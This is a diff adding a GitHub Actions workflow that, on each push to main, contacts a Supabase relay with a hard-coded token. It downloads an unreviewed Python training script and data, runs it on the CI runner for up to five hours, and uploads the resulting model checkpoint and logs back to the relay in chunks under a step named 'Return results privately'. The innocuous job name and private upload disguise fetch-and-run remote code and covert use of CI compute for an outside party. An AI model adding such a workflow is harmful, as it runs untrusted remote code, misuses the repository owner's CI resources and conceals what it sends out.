@@ -1,0 +1,66 @@
+name: Temporary Ubuntu Job
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    env:
+      RELAY: https://hiyduakdyfcpibwxrtan.supabase.co/functions/v1/runner-relay-temp
+      SOURCE: KPt6QrEnXTLVgbcsFyBEOpyIRkiWKpou
+    steps:
+      - name: Prepare temporary workspace
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/job/out
+          SESSION="$(curl -fsS --retry 3 "${RELAY}?kind=session&source=${SOURCE}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["session"])')"
+          printf '%s' "$SESSION" > /tmp/job/session
+          curl -fsS --retry 3 "${RELAY}?kind=data&session=${SESSION}" -o /tmp/job/data.txt
+          curl -fsS --retry 3 "${RELAY}?kind=trainer&session=${SESSION}" -o /tmp/job/task.py
+          test "$(wc -c < /tmp/job/data.txt)" -gt 1000000
+          test "$(wc -c < /tmp/job/task.py)" -gt 5000
+          python3 -m pip install --disable-pip-version-check --quiet --index-url https://download.pytorch.org/whl/cpu torch==2.7.1
+
+      - name: Run compute task
+        shell: bash
+        run: |
+          set -euo pipefail
+          export OMP_NUM_THREADS="$(nproc)"
+          export MKL_NUM_THREADS="$(nproc)"
+          python3 /tmp/job/task.py --data /tmp/job/data.txt --out /tmp/job/out --batch 16 --pretrain-max 2500 --sft-max 900 2>&1 | tee /tmp/job/train.log
+
+      - name: Return results privately
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          SESSION="$(cat /tmp/job/session)"
+          upload_file() {
+            local src="$1" name="$2"
+            [ -f "$src" ] || return 0
+            local dir
+            dir="$(mktemp -d)"
+            split -b 300000 -d -a 3 "$src" "$dir/part-"
+            mapfile -t parts < <(find "$dir" -type f -name 'part-*' | sort)
+            local total="${#parts[@]}" i=0
+            for f in "${parts[@]}"; do
+              curl -fsS --retry 3 -X POST \
+                -H "x-file-name: ${name}" \
+                -H "x-part: ${i}" \
+                -H "x-total: ${total}" \
+                --data-binary "@$f" \
+                "${RELAY}?kind=upload&session=${SESSION}" >/dev/null
+              i=$((i+1))
+            done
+            rm -rf "$dir"
+          }
+          upload_file /tmp/job/out/kaganyz-v2.pt checkpoint.bin
+          upload_file /tmp/job/out/metrics-v2.json metrics.json
+          upload_file /tmp/job/train.log train.log
